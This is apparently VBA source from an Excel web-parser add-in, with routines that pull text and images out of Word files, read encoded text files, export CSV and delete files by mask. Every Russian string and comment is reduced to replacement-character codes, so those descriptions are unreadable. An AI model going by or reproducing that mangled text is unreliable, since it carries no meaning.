    With AAs.AddAction(fc_Files, "ExportImagesFromFile_WORD", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| MS Word")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| MS Word (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| doc, docx, docm, rtf)."
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Folder", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "\images\"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "image_{image_index}"
        .AddParameter "ImageFormat", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("jpg", "png", "gif"), "jpg"
    End With
    
    With AAs.AddAction(fc_Files, "DeleteFiles", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| c:\folder\subfolder\), |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| \folder)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| \, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| *.*, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| *.xls*"
        .AddParameter "Folder", aps_Text, "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Mask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("*.*", "*.xls*", "*.doc*", "*.txt", "*.html"), "*.xls*"
    End With
    
    With AAs.AddAction(fc_Files, "ShowFileDialog", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & _
            "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)."
        Dim tarr: tarr = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| XML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .AddParameter "Title", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", tarr, tarr(1)
        .AddParameter "FilterDescription", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("Excel files", "XML files", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"), "XML files"
        .AddParameter "FilterExtension", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("*.*", "*.xls*", "*.xml", "*.txt", "*.doc*"), "*.*"
        .AddParameter "Multiselect", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Files, "ExportTextToFile", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "c:\folder\filename.csv, - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "\folder\filename.csv - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser.xla)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - \folder\) - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "\files\{ParserName} {time=DD.MM.YYYY HH-NN-SS}.csv"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("utf-8", "windows-1251"), "windows-1251"
        .AddParameter "ShowFileInFolder", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With
    
End Sub


Function GetTextFromFile_WORD(ByVal FileName$, Optional ByVal RestartApp$, Optional ByVal ReadOnly$, Optional ByVal OutputFormat$ = "text") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / HTML |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| filename$
    On Error Resume Next
    Dim WD As Object, AppName$
    
    If (RestartApp$ = "|fffd||fffd|") And Not (WA Is Nothing) Then
        WA.Quit: DoEvents
        Set WA = Nothing
    End If
    AppName$ = WA.Name
    
    If (WA Is Nothing) Or (AppName$ = "") Then
        Set WA = CreateObject("Word.Application")
        WA.Visible = False        ' |fffd||fffd||fffd||fffd||fffd||fffd| Word |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If
    If WA Is Nothing Then GetTextFromFile_WORD = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word": Exit Function
    
    Set WD = WA.Documents.Open(FileName:=FileName$, ReadOnly:=(ReadOnly$ = "|fffd||fffd|"))
    
    Select Case OutputFormat$
        Case "HTML"
            Dim tmp_filename$, headers$
            headers$ = GetWordDocumentHeadersAndFooters(WD)
            
            tmp_filename$ = FWF.temp_filename & ".htm"
            
            WD.SaveAs FileName:=tmp_filename$, FileFormat:=10
            WD.Close False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            GetTextFromFile_WORD = FWF.ReadTXTfile(tmp_filename$)
            GetTextFromFile_WORD = Split(GetTextFromFile_WORD, "</head>")(1)
            GetTextFromFile_WORD = Split(GetTextFromFile_WORD, "</html>")(0)
            GetTextFromFile_WORD = Replace(GetTextFromFile_WORD, "class=MsoNormal ", "")
            RemoveExtraSeparators GetTextFromFile_WORD, vbNewLine
            GetTextFromFile_WORD = headers$ & GetTextFromFile_WORD
            
        Case "text"
            GetTextFromFile_WORD = WD.Range.text
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| {NL}
            GetTextFromFile_WORD = Replace(GetTextFromFile_WORD, Chr(13) & Chr(7), Chr(13))
            GetTextFromFile_WORD = Replace(GetTextFromFile_WORD, Chr(13) & Chr(10), Chr(13))
            GetTextFromFile_WORD = Replace(GetTextFromFile_WORD, Chr(13), Chr(13) & Chr(10))
            WD.Close False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            
    End Select
End Function

Function GetWordDocumentHeadersAndFooters(ByRef WD As Object) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    Dim Section As Object, txt$, v$
    For Each Section In WD.Sections
        v$ = "": v$ = Section.headers(3).Range.text ' wdHeaderFooterEvenPages
        If (v$ <> "" And v$ <> Chr(13)) Then txt$ = txt$ & "<header section=""" & Section.Index & """ class=""EvenPages""" & ">" & v$ & "</header>" & vbNewLine
        
        v$ = "": v$ = Section.headers(2).Range.text ' wdHeaderFooterFirstPage
        If (v$ <> "" And v$ <> Chr(13)) Then txt$ = txt$ & "<header section=""" & Section.Index & """ class=""FirstPage""" & ">" & v$ & "</header>" & vbNewLine
        
        v$ = "": v$ = Section.headers(1).Range.text ' wdHeaderFooterPrimary
        If (v$ <> "" And v$ <> Chr(13)) Then txt$ = txt$ & "<header section=""" & Section.Index & """ class=""Primary""" & ">" & v$ & "</header>" & vbNewLine
        
        v$ = "": v$ = Section.Footers(3).Range.text ' wdHeaderFooterEvenPages
        If (v$ <> "" And v$ <> Chr(13)) Then txt$ = txt$ & "<footer section=""" & Section.Index & """ class=""EvenPages""" & ">" & v$ & "</footer>" & vbNewLine
        
        v$ = "": v$ = Section.Footers(2).Range.text ' wdHeaderFooterFirstPage
        If (v$ <> "" And v$ <> Chr(13)) Then txt$ = txt$ & "<footer section=""" & Section.Index & """ class=""FirstPage""" & ">" & v$ & "</footer>" & vbNewLine
        
        v$ = "": v$ = Section.Footers(1).Range.text ' wdHeaderFooterPrimary
        If (v$ <> "" And v$ <> Chr(13)) Then txt$ = txt$ & "<footer section=""" & Section.Index & """ class=""Primary""" & ">" & v$ & "</footer>" & vbNewLine
    Next
    GetWordDocumentHeadersAndFooters = txt$
End Function

Function ExportImagesFromFile_WORD(ByVal FileName$, ByVal Folder$, ByVal Mask$, ByVal image_format$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| filename$
    On Error Resume Next
    
    If Folder$ = "" Then Folder$ = "\images"
    If Folder$ Like "\[!\]*" Then Folder$ = ThisWorkbook.Path & Folder$
    If Not FolderExists(Folder$) Then
        Err.Clear
        SHCreateDirectoryEx Application.Hwnd, Folder$, ByVal 0&        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        If Err Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| Word: |fffd|" & Folder$ & "|fffd|", vbExclamation
            Exit Function
        End If
    End If
    If Right(Folder$, 1) <> "\" Then Folder$ = Folder$ & "\"
    
    Dim WD As Object, ISh As Object, n&, filenames_array As Variant, image_filename$, SU As Boolean, AppName$
    If InStr(1, Mask$, ARSEP) Then filenames_array = Split(Mask$, ARSEP)
    
    AppName$ = WA.Name
    If (WA Is Nothing) Or (AppName$ = "") Then
        Set WA = CreateObject("Word.Application")
        WA.Visible = False        ' |fffd||fffd||fffd||fffd||fffd||fffd| Word |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If
    If WA Is Nothing Then ExportImagesFromFile_WORD = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word": Exit Function
    
    Set WD = WA.Documents.Open(FileName$)
    
    SU = Application.ScreenUpdating: Application.ScreenUpdating = False
    WA.ScreenUpdating = False
    For Each ISh In WD.Range.InlineShapes
        'Debug.Print ISh.Type, ISh.Width
        ISh.Range.CopyAsPicture
        WA.Selection.EndKey 6        ' wdStory=6
        With WA.Selection.InlineShapes.AddChart(51).Chart
            .ChartArea.Format.line.Visible = 0
            .Legend.Delete
            
            .Parent.Width = ISh.Width
            .Parent.Height = ISh.Height
            .Paste
            n = n + 1: image_filename$ = ""
            If IsArray(filenames_array) Then
                image_filename$ = filenames_array(n - 1)
            Else
                image_filename$ = Replace(Mask$, "{image_index}", n)
            End If
            If Len(image_filename$) Then
                image_filename$ = Folder$ & image_filename$ & "." & LCase(image_format$)
                .Export image_filename$, UCase(image_format$)
                ExportImagesFromFile_WORD = ExportImagesFromFile_WORD & ARSEP & image_filename$
            End If
            .Delete
        End With
    Next
    WA.ScreenUpdating = True
    Application.ScreenUpdating = SU
    
    WD.Close False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Function

Function LoadTextFromTextFile(ByVal FileName$, Optional ByVal Encoding$, Optional ByRef WP As WebsiteParser) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Charset$ |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| filename$
    On Error Resume Next: Dim txt$
    'If Trim(Encoding$) = "" Then Encoding$ = "windows-1251"
    Dim FSO As FileSystemObject, ts As TextStream
    Set FSO = CreateObject("scripting.filesystemobject")
    WP.PrInd1.ShowMessage tt("PI_ShowMessage_ReadingFromFile", FileOrFolderSize(FileLen(FileName$)))
    
    Select Case Trim(Encoding$)
        Case "", "ansi", "windows-1251"
            Set ts = FSO.OpenTextFile(FileName$, 1, True): LoadTextFromTextFile = ts.ReadAll: ts.Close
            
        Case "utf-16"
            Set ts = FSO.OpenTextFile(FileName$, 1, True, True): LoadTextFromTextFile = ts.ReadAll: ts.Close
            
            '        Case "utf-8"
            '            txt$ = ReadFile(Filename$)
            '            LoadTextFromTextFile = WinToUTF8(txt$)
            '            txt = ""
            
        Case Else
            With CreateObject("ADODB.Stream")
                .Type = 2:
                If Len(Encoding$) Then .Charset = Encoding$
                .Open
                .LoadFromFile FileName$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                WP.PrInd1.ShowMessage tt("PI_ShowMessage_EncodingFile", FileOrFolderSize(FileLen(FileName$)))
                LoadTextFromTextFile = .ReadText        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileContent$
                .Close
            End With
    End Select
    WP.PrInd1.ShowMessage ""
    Set ts = Nothing: Set FSO = Nothing
End Function


Function ExportTextToFile(ByVal txt$, ByVal FileName$, ByVal Encoding$, Optional ByVal OpenFolder As Boolean, Optional ByVal WP As WebsiteParser) As String
    On Error Resume Next
    If WP Is Nothing Then Set WP = RunningParser
    Dim FilePath$
    FilePath$ = GetFilenameAndCreatePathForFile(FileName$, "export.csv")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    If FilePath$ = "" Then Exit Function
    If Trim(Encoding$) = "" Then Encoding$ = "utf-8"
    
    WP.PrInd1.ShowMessage tt("PI_ShowMessage_ExportToFile") & " ..."
    
    DoEvents
    
    Application.DisplayAlerts = False
    If Dir(FilePath$, vbNormal) <> "" Then
        If Not Workbooks(Dir(FilePath$, vbNormal)) Is Nothing Then
            Workbooks(Dir(FilePath$, vbNormal)).Close False
            SetAttr FilePath$, vbNormal
            Kill FilePath$
        End If
    End If
    Application.DisplayAlerts = True
    
    WP.PrInd1.ShowMessage tt("PI_ShowMessage_ExportToFileAndEncode")
    
    If SaveTextToFile(txt$, FilePath$, Encoding$) Then
        ExportTextToFile = FilePath$
        If OpenFolder Then FWF.ShowFile FilePath$
    Else
        WP.SetError "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|", _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Encoding$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| #" & _
            Err.Number & " (" & Err.Description & ")" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| <a href=""file:///" & Replace(FilePath$, "\", "/") & """>" & Dir(FilePath$) & _
            "</a> |fffd||fffd||fffd||fffd||fffd| " & FileOrFolderSize(FileLen(FilePath$)), FilePath$
        Debug.Print Err.Description, Err.Number, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| " & vbNewLine & FileName
    End If
    WP.PrInd1.HideMessages
End Function

Attribute VB_Name = "mod_AAs_HTML"
'---------------------------------------------------------------------------------------
' Module        : mod_ARRAY_HTML_FUNCTIONS
' Author        : Igor Vakhnenko            Date: 18.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_HTML(ByRef AAs As ArrayActions)
    Dim TAGS_ARRAY As Variant: TAGS_ARRAY = Array("div", "span", "table", "tr", "a", "p", "h1", "h2", "h3")

    With AAs.AddAction(fc_UNUSED, "GetElementsByTagNameAndClassName", "# HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
